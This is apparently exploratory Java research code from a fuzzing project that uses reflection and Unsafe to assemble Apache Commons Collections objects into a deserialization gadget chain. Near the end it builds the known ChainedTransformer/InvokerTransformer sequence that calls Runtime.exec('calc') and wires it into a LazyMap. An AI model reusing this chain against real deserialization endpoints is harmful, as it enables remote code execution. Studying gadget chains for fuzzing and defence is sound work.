package edu.berkeley.cs.jqf.examples.GadgetChain;

import com.pholser.junit.quickcheck.generator.Generator;
import com.pholser.junit.quickcheck.generator.java.lang.AbstractStringGenerator;
import com.sun.tools.javac.parser.UnicodeReader;
import edu.berkeley.cs.jqf.examples.common.AlphaStringGenerator;
import org.apache.commons.collections.Factory;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import sun.misc.Unsafe;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.nio.file.Files;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.lang.reflect.Array;

public class ObjectTest {
    public static Object objectInit(String classname) throws Exception {
        Class<?> target_classname = Class.forName(classname);
        Field f = Unsafe.class.getDeclaredField("theUnsafe");
        f.setAccessible(true);
        Unsafe unsafe = (Unsafe) f.get(null);
        return unsafe.allocateInstance(target_classname);
    }

    public static void main(String[] args) throws Exception {
        System.out.println(objectInit("org.apache.commons.collections4.comparators.TransformingComparator"));
        System.out.println(objectInit("org.apache.commons.collections4.comparators.TransformingComparator").getClass());

/*        Class clazz = objectInit("java.util.HashMap").getClass();
        System.out.println(1111333);
        // 获取类中声明的字段
        Field[] fields = clazz.getDeclaredFields();
        for (Field field : fields) {
            // 避免 can not access a member of class com.java.test.Person with modifiers "private"
            field.setAccessible(true);
            try {
                if (field.getType().isArray()) {
                    System.out.println(field.getClass().getComponentType());
                    System.out.println(33333333);
                }
                System.out.println(field.getName() + ":"+ field.get(objectInit("java.util.HashMap")));
*//*                System.out.println(field.getGenericType());
                System.out.println(field.getClass());*//*
                System.out.println(field.getType());
                System.out.println(field.getType().getName().substring(2,field.getType().getName().length()-1));
*//*                if (field.getType().isAssignableFrom(objectInit("org.apache.commons.collections4.comparators.TransformingComparator").getClass())) {
                    System.out.println(13123123);
                }*//*
                System.out.println("----------------------");
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            }
        }*/

        List<String> lines = Files.readAllLines(new File("chain_ysoserial.txt").toPath());

        for(String line : lines){
            // Do whatever you want
            System.out.println(line);
            break;
        }
/*        Object hashset = objectInit("java.util.HashSet");
        Field[] fields3 = hashset.getClass().getDeclaredFields();//获取所有属性
        Arrays.stream(fields3).forEach(field1 -> {
            //获取是否可访问
            boolean flag = field1.isAccessible();
            try {
                //设置该属性总是可访问
                field1.setAccessible(true);
                System.out.println("变量类型为:" + field1.getType().getName() + ", 成员变量" + field1.getName() + "的值为:" + field1.get(hashset));
                if (field1.getType().getName().equals(("java.util.HashMap"))) {
                    field1.set(hashset, objectInit("java.lang.Object"));
                    System.out.println(123);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            //还原可访问权限
            field1.setAccessible(flag);
        });*/



        if (objectInit("java.util.HashMap$Node").getClass().isAssignableFrom(objectInit("org.apache.commons.collections.keyvalue.TiedMapEntry").getClass())) {
            System.out.println(true);
        }
        if (Object.class.isAssignableFrom(int.class)) {
            System.out.println(3333);
        }
        System.out.println(123123123);

        HashMap hashMap = new HashMap();
        HashSet hashSet = new HashSet();

        System.out.println(hashSet.getClass().getName());

        hashSet.add("String");
        Field field = hashSet.getClass().getDeclaredField("map");
        field.setAccessible(true);
        //System.out.println(hashSet);
        //HashMap hashset_map = (HashMap)field.get(hashSet);
        //System.out.println(hashset_map);
        //field.set(hashSet, hashMap);
        System.out.println(hashSet);

        Field[] fields123 = hashSet.getClass().getDeclaredFields();//获取所有属性
        Arrays.stream(fields123).forEach(field1 -> {
            //获取是否可访问
            boolean flag = field1.isAccessible();
            try {
                //设置该属性总是可访问
                field1.setAccessible(true);
                System.out.println("变量类型为:" + field1.getType().getName() + ", 成员变量" + field1.getName() + "的值为:" + field1.get(hashSet));
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            }
            //还原可访问权限
            field1.setAccessible(flag);
        });

        Object obj = objectInit("org.apache.commons.collections.map.LazyMap");
/*        System.out.println(obj);*/
        System.out.println("??????+++++++++");

        Field[] fiel = obj.getClass().getDeclaredFields();//获取所有属性
        Arrays.stream(fiel).forEach(field1 -> {
            //获取是否可访问
            boolean flag = field1.isAccessible();
            try {
                //设置该属性总是可访问
                field1.setAccessible(true);
                if (field1.getType().isAssignableFrom(objectInit("org.apache.commons.collections.functors.InvokerTransformer").getClass())) {
                    field1.set(obj, objectInit("org.apache.commons.collections.functors.InvokerTransformer"));
                }
                System.out.println("变量类型为:" + field1.getType().getName() + ", 成员变量" + field1.getName() + "的值为:" + field1.get(obj));
            } catch (Exception e) {
                e.printStackTrace();
            }
            //还原可访问权限
            field1.setAccessible(flag);
        });

        System.out.println("-=========-----------===");
        HashMap hasmap = new HashMap<>();
        hasmap.put("key", "value");

        Field[] fieee = obj.getClass().getSuperclass().getDeclaredFields();
        Arrays.stream(fieee).forEach(field1 -> {
            //获取是否可访问
            boolean flag = field1.isAccessible();
            try {
                //设置该属性总是可访问
                field1.setAccessible(true);
                field1.set(obj, hasmap);
                System.out.println("变量类型为:" + field1.getType().getName() + ", 成员变量" + field1.getName() + "的值为:" + field1.get(obj));
            } catch (Exception e) {
                e.printStackTrace();
            }
            //还原可访问权限
            field1.setAccessible(flag);
        });


        Object obj2 = objectInit("org.apache.commons.collections.keyvalue.TiedMapEntry");
        //System.out.println(obj2);
        System.out.println("----------------------");
        HashMap hashMap1 = new HashMap();
        hashMap1.put("key", "value");

        Field[] target_field = obj2.getClass().getDeclaredFields();
        for (Field field2 : target_field) {
            field2.setAccessible(true);
            if (field2.getType().isAssignableFrom(obj.getClass()) && field2.getName().equals("map")) {
                System.out.println(123);
                //field2.set(obj2, concHashMap);
                //System.out.println(field2.get("key1"));
            }
            System.out.println("变量类型为:" + field2.getType().getName() + ", 成员变量" + field2.getName() + "的值为:" + field2.get(obj2));
        }

        System.out.println("------------------");

        Object obj34 = objectInit("java.util.HashMap$Node");
        System.out.println("yes");
        Field[] target = obj34.getClass().getDeclaredFields();
        for (Field field3 : target) {
            field3.setAccessible(true);
            if (field3.getName().equals("key")){
                field3.set(obj34, "key");
            }
            if (field3.getName().equals("value")){
                field3.set(obj34, "value");
            }
            System.out.println("变量类型为:" + field3.getType().getName() + ", 成员变量" + field3.getName() + "的值为:" + field3.get(obj34));
        }
        System.out.println(obj34);
        System.out.println("--------------------");

        Class<?> c = Class.forName("java.util.HashMap$Node");
        System.out.println(Array.newInstance(c, 3));

        Object obj3423 = objectInit("java.util.HashMap");
        Field[] target12323 = obj3423.getClass().getDeclaredFields();
        for (Field field3 : target12323) {
            field3.setAccessible(true);
            if (field3.getType().isArray()) {
                System.out.println(1111);
                System.out.println(c);
                field3.set(obj3423, Array.newInstance(c, 3));
                System.out.println(Array.get(Array.newInstance(c, 3), 0));
                TiedMapEntry tiedMapEntry = new TiedMapEntry(hashMap, "foo");
/*                Object[] obj13 = (Object[]) Array.newInstance(c, 3);*/

/*                Array.set(Array.newInstance(c, 3), 0, tiedMapEntry);*/
                System.out.println(Array.get(Array.newInstance(c, 3), 0));
                System.out.println(Array.get(Array.newInstance(c, 3), 1));
                System.out.println(Array.get(Array.newInstance(c, 3), 2));
            }
            if (java.util.Set.class.isAssignableFrom(field3.getType())) {
                field3.set(obj3423, hashSet);
            }
            System.out.println("变量类型为:" + field3.getType().getName() + ", 成员变量" + field3.getName() + "的值为:" + field3.get(obj3423));
        }
        int[] test = (int[])Array.newInstance(int.class, 3);
        System.out.println(Arrays.toString(test));


        System.out.println("------------+++++++++++");
        HashSet hashSet2 = new HashSet();
        hashSet2.add("key");
        hashSet2.add("value");
        System.out.println(hashSet2);

        HashMap hashMap2 = new HashMap<>();
        hashMap2.put("key","value");
        System.out.println(hashMap2);

        Field[] tar1= hashSet2.getClass().getDeclaredFields();
        for (Field field2 : tar1) {
            field2.setAccessible(true);
            if (field2.getType().getName().equals("java.util.HashMap")) {
                field2.set(hashSet2, hashMap2);
            }
            System.out.println("变量类型为:" + field2.getType().getName() + ", 成员变量" + field2.getName() + "的值为:" + field2.get(hashSet2));
        }

        System.out.println("++++++++++++");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
        };
        ChainedTransformer chain13 = new ChainedTransformer(transformers);
        Object chain = objectInit("org.apache.commons.collections.functors.InvokerTransformer");
        Object lazyMap = objectInit("org.apache.commons.collections.map.LazyMap");
        Object tiedMapEntry = objectInit("org.apache.commons.collections.keyvalue.TiedMapEntry");

        Field[] tar2= hashMap2.getClass().getDeclaredFields();
        for (Field field2 : tar2) {
            field2.setAccessible(true);
            if (field2.getType().getName().equals("[Ljava.util.HashMap$Node;")) {
                Object[] obj13 = (Object[]) Array.newInstance(c, 3);
                Object obj_2 = objectInit("java.util.HashMap$Node");
                for (int i = 0; i < 3; i++) {
                    Array.set(obj13, i, objectInit("java.util.HashMap$Node"));
                    System.out.println(obj13[i]);
                    Field[] subClass_Field = obj13[i].getClass().getDeclaredFields();
                    for (Field sub_field : subClass_Field) {
                        sub_field.setAccessible(true);
                        if (sub_field.getName().equals("key")){
                            sub_field.set(obj34, "key");
                        }
                        if (sub_field.getName().equals("value")){
                            sub_field.set(obj34, "value");
                        }
                        if (sub_field.getType().isAssignableFrom(tiedMapEntry.getClass())) {
                            sub_field.set(obj13[i], tiedMapEntry);
                        }
                    }
                }
                //System.out.println(obj13[0]);
                System.out.println("OK");
            }
            if (field2.getType().getName().equals("java.util.Set")) {
                field2.set(hashMap2, hashSet2);
                //System.out.println(true);
            }
            System.out.println("变量类型为:" + field2.getType().getName() + ", 成员变量" + field2.getName() + "的值为:" + field2.get(hashMap2));
        }
        System.out.println("------------------");

        Field[] tar3= tiedMapEntry.getClass().getDeclaredFields();
        for (Field field2 : tar3) {
            field2.setAccessible(true);
            System.out.println("变量类型为:" + field2.getType().getName() + ", 成员变量" + field2.getName() + "的值为:" + field2.get(tiedMapEntry));
            if (field2.getName().equals("map")) {
                field2.set(tiedMapEntry, lazyMap);
                System.out.println("======");
            }
            if (field2.getName().equals("key")) {
                field2.set(tiedMapEntry, "key");
                System.out.println("-2-2-2-2");
                System.out.println(field2.get(tiedMapEntry));
            }
        }

        Field[] tar4= lazyMap.getClass().getDeclaredFields();
        for (Field field2 : tar4) {
            field2.setAccessible(true);
            System.out.println("变量类型为:" + field2.getType().getName() + ", 成员变量" + field2.getName() + "的值为:" + field2.get(lazyMap));
            if (field2.getName().equals("factory")) {
                field2.set(lazyMap, chain13);
                System.out.println("==++");
            }
        }




/*        //Field[] tar = Array.newInstance(c, 3).getClass().getDeclaredFields();
        System.out.println("----------------");
        Object[] obj13 = (Object[]) Array.newInstance(c, 3);
        System.out.println(Arrays.toString(obj13));
        System.out.println(obj13.getClass());
        Array.set(obj13, 0, objectInit("java.util.HashMap$Node"));
        System.out.println(Arrays.toString(obj13));
        System.out.println(Array.get(obj13, 0).getClass());
        Field[] tar = obj13[0].getClass().getDeclaredFields();

        System.out.println(tar.length);
        for (Field f : tar) {
            f.setAccessible(true);
            if (f.getType().isAssignableFrom(tiedMapEntry.getClass())) {
                System.out.println(123);
                f.set(obj13[0], tiedMapEntry);
                System.out.println(true);
            }
            System.out.println("变量类型为:" + f.getType().getName() + ", 成员变量" + f.getName() + "的值为:" + f.get(obj13[0]));
        }*/

        System.out.println("-------------------");
        PriorityQueue queue = new PriorityQueue();
        Field[] tar = queue.getClass().getDeclaredFields();
        for (Field f : tar) {
            f.setAccessible(true);
            if (Modifier.isStatic(f.getModifiers())) {
                System.out.println(true);
            }
            System.out.println("变量类型为:" + f.getType().getName() + ", 成员变量" + f.getName() + "的值为:" + f.get(queue));
        }

    }
}
